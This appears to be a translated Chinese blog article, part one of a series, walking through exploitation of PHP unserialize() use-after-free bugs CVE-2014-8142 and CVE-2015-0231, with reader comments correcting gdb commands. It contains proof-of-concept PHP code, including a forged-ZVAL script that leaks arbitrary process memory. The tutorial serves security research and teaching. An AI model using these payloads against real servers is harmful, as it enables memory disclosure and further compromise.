<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">PHP中的内存破坏漏洞利用（CVE-2014-8142和CVE-2015-0231）（连载之第一篇）</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Chuck</a> <span class="bull">·</span> <time title="2015/02/10 10:14" ui-time="" datetime="2015/02/10 10:14" class="published ng-binding ng-isolate-scope">2015/02/10 10:14</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p>作者：Cigital公司的安全顾问Qsl1pknotp</p><p>题目：Exploiting memory corruption bugs in PHP (CVE-2014-8142 and CVE-2015-0231) Part 1</p><p>地址：http://www.inulledmyself.com/2015/02/exploiting-memory-corruption-bugs-in.html</p><p>很多人都认为，对基于Web的应用程序来说，内存崩溃类bug不是什么严重问题。尤其现在XSS和SQL注入类漏洞仍然大行其事的情况下，不会有多少注意力投入到这类bug中，它们会被当做“不可利用”或者被直接无视。然而，假如攻击成功，利用这类漏洞进行攻击所导致的结果将远远超出SQL注入以及XSS，因为：</p><pre><code>1. 攻击者将得到有保证的系统访问权。
2. 将会很难识别恶意攻击数据流量。
3. 需要维护者/供应商提供专门补丁，并且只能希望修补得没有问题。
</code></pre><p>接下来笔者将发表三篇该系列攻击的文章，本文是其中的首篇。该系列将从CVE-2014-8142的利用开始讲起、然后是远程任意信息泄露、最后以获取PHP解释器的控制权结束。Stefan Esser（@i0n1c）是这两个CVE的原作者，并且是在2010年Syscan上第一个讲解如何控制PHP解释器（被称为“ret2php”）的。</p><h1>0x01 漏洞起源</h1><hr><p>这一切都始于2004年，Esser在unserialize()函数中发现的一个Use After Free漏洞。这是一个Hardened-PHP（译者注：如果项目中，服务器的安全性是最重要的，就可以称为是Hardened-PHP）项目的一部分，没有任何代码公开。2010年，Esser又在SPLObjectStorage的unserialize()中发现另一个User After Free，这个漏洞直接产生了Syscan会上的一个发言，跟第一次漏洞一样，本次也没有代码公开。最后，CVE-2014-8142被发现，又被打补丁，但是因为补丁没打好，又导致了CVE-2015-0231。</p><p>幸运的是，这次Stefan终于给出了一个可令PHP解释器产生故障的POC。下面的代码就会导致有此漏洞的PHP解释器出现问题。</p><pre><code>#!php
&lt;?php
for ($i=4; $i&lt;100; $i++) {
  var_dump($i);

  $m = new StdClass(); 
  $u = array(1); 
  $m-&gt;aaa = array(1,2,&amp;$u,4,5);

  $m-&gt;bbb = 1;
  $m-&gt;ccc = &amp;$u;
  $m-&gt;ddd = str_repeat("A", $i); 
  $z = serialize($m);
  $z = str_replace("bbb", "aaa", $z);

  var_dump($z);

  $y = unserialize($z);

  var_dump($y);
}
?&gt;
</code></pre><p>source: <a href="https://gist.github.com/tmm08a/d07bfcb4eca90a6d3926#file-stefanesser_original_poc">StefanEsser&#95;Original&#95;POC</a></p><h1>0x02 漏洞分析利用</h1><hr><p>下面来解释下POC是如何工作的：我们通过重新添加“aaa”对象的值（不同值），来更新对象“aaa”，然而“ccc”对象其实还是指向原始“aaa”对象中的某一个值。</p><p>既然我们已经在顶层实现上知道了它的工作原理，接下来就让我们一起试着找到问题的罪魁祸首吧。我们在process&#95;nested&#95;data函数中寻找，快速浏览一下，会发现一段特定的代码：</p><p><img alt="enter image description here" img-src="eff4aad082d307c26baac980d5d88556d26ff54d.jpg"></p><p>让我们一起跟进脚本中来确定真正发生了什么。我们将断点断在var&#95;unserializer.c的第337行来看一下（此处位于process&#95;nested_data函数内）。</p><p><img alt="enter image description here" img-src="98c0810855eb7c8c7655f37693d7bd1b7c473330.jpg"></p><p>继续运行，跟过下面的代码：</p><pre><code>#!php
&lt;?php
$data ='O:8:"stdClass":3:{s:3:"aaa";a:5:{i:0;i:1;i:1;i:2;i:2;s:39:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";i:3;i:4;i:4;i:5;}s:3:"aaa";i:1;s:3:"ccc";R:5;}';
$x = unserialize($data);
var_dump($x);
?&gt;
</code></pre><p>source:<a href="https://gist.github.com/tmm08a/686d3f78a44c8ea80fd0#file-stefanesser_original_localmemleak-php">StefanEsser&#95;Original&#95;LocalMemLeak.php</a></p><p>运行上面的脚本，断点第一次命中时跳过，第二次命中时，执行下面的查看命令：</p><pre><code>#!php
printzv *(var_entries)var_hash-&gt;first
</code></pre><p><img alt="enter image description here" img-src="0df3a27edffc4cfce82e6953aab8c900d5e1f8e0.jpg"></p><p>可以看到地址的一个数组，这些地址指向unserialize()函数解析的变量值。我们感兴趣的是第五个0xb7bf87c0（我们上面php代码中用的是R:5）。既然已经得到地址，我们就去看一下内容，然后步过该断点并继续运行。</p><p><img alt="enter image description here" img-src="aee8ce0c4637739263a5c30c656976ccc4bc9222.jpg"></p><p>已经调用完该可疑函数，接下来重新看一下刚才我们选定的地址中出现了什么内容：</p><p><img alt="enter image description here" img-src="df14a2fdf74e63f86ff67033d3f54745ab054dcc.jpg"></p><p>成功搞定！当然，还需要确认下该地址是否还在var_hash表中，然后继续运行。</p><p><img alt="enter image description here" img-src="f2a40f706efda59c3e88c3bc842dc06c2fbddec1.jpg"></p><p>果然还在，继续：</p><p><img alt="enter image description here" img-src="692c664214aa98a77b5213e78044a4ac6824c1ac.jpg"></p><p>Sweet！已经可以泄露前面地址中的数据了。我们现在已经可以成功泄露出之前所提供字串的长度，但这其实没什么意思。那么能不能泄露出任意内存数据呢？下面就是你想要的代码：</p><pre><code>#!php
&lt;?php

$fakezval = pack(
    'IIII',     //unsigned int
    0x08048000, //address to leak
    0x0000000f, //length of string
    0x00000000, //refcount
    0x00000006  //data type NULL=0,LONG=1,DOUBLE=2,BOOL=3,ARR=4,OBJ=5,STR=6,RES=7
);
//obj from original POC by @ion1c
$obj = 'O:8:"stdClass":4:{s:3:"aaa";a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:"aaa";i:1;s:3:"ccc";R:5;s:3:"ddd";s:4:"AAAA";}';
$obj=unserialize($obj);

for($i = 0; $i &lt; 5; $i++) { //this i value is larger than usually required
    $v[$i]=$fakezval.$i; //repeat to overwrite
}
//due to the reference being overwritten by our loop above, leak memory
echo $obj-&gt;ccc;
?&gt;
</code></pre><p>source: <a href="https://gist.github.com/tmm08a/4c3130001a258e45d39f#file-phpleak">PHPLeak</a></p><p>下面是输出数据：</p><p><img alt="enter image description here" img-src="69e24c51b4c0078e71c52104efc4382ff3778332.jpg"></p><p>我们这里做的操作是非常简单的（希望是）。我们创建自己的ZVAL（PHP使用的内部数据结构）数据结构。我们定义了几个东西，使pack（）函数获取我们的代码执行。按照顺序，它们是：</p><pre><code>类型（例子中用的是unsigned int）
地址（我们想要泄露的地址）
长度（我们想要泄露内存的长度）
参考标志（0）
数据类型（6，代表String类型）
</code></pre><p>当然，如果我们没有伪造一个string ZVAL结构，这些值是会变化的。代码中的for循环是真正执行内存覆盖操作（覆盖之前释放掉的内存），这些操作使我们得到上述的输出数据。代码中我令循环数$i的值大于其所需的值，只是用以确保代码的通用性，当然我测试过的大多数机器只需要2次就可以了，不需要执行5次。</p><p>好了，现在已经可以泄露随意地址数据了，让我们再一起看看CVE-2015-0231？很简单：只需将“aaa”替换成“123”，看一下输出的数据：</p><p><img alt="enter image description here" img-src="ef6c600b1fb40b97ea6d4fe052e3d217abe478de.jpg"></p><h1>0x03 下一步研究</h1><hr><p>通过上述过程，我们已经完成了一个可在本地泄露任意内存地址数据的POC，且该POC同时适用于两个CVE漏洞的。我们下一步目标是仍然是数据泄露，所不同的是，将会是远程数据泄露！</p><p>敬请期待第二回，远程数据泄露！</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">L.N.</span> <span class="reply-time">2016-06-02 18:39:45</span></div><p></p><p>@Chuck 其实不是原文写错了，printzv 是php中定义的一些命令，在php源码目录下有一个.gdbinit文件，用source加载进去 就行了。感觉文章中问题比较多.....</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">phith0n</span> <span class="reply-time">2015-02-28 22:44:40</span></div><p></p><p>第二篇是重点呀~~嘿</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xcrypt</span> <span class="reply-time">2015-02-11 21:56:01</span></div><p></p><p>原来行号前少了个冒号，b var_unserializer.c:267<br>而且也要自己编译。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Chuck</span> <span class="reply-time">2015-02-11 19:13:22</span></div><p></p><p>还有，应该是下到337啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Chuck</span> <span class="reply-time">2015-02-11 19:07:11</span></div><p></p><p>是不是你的php版本不对？<br>kali自带的php确实会提示没定义，<br>你可以试着重新编译安装下php-5.4.34</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xcrypt</span> <span class="reply-time">2015-02-11 15:39:45</span></div><p></p><p>在gdb下运行b var_unserializer.c 267<br>得到提示<br>Function &quot;var_unserializer.c 267&quot; not defined.<br>是什么情况？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Chuck</span> <span class="reply-time">2015-02-10 21:27:53</span></div><p></p><p>原文就写错了，非是翻译问题。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Chuck</span> <span class="reply-time">2015-02-10 21:27:18</span></div><p></p><p>纠正一下：<br>printzv *(var_entries)var_hash-&gt;first<br>应该改为：<br>print *(var_entries*)var_hash-&gt;first</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2015-02-10 20:12:22</span></div><p></p><p>期待第二篇</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">noob</span> <span class="reply-time">2015-02-10 15:49:25</span></div><p></p><p>等待第二篇</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lxj616</span> <span class="reply-time">2015-02-10 11:27:39</span></div><p></p><p>期待第二篇</p><p></p></div></div></div></div></div></main>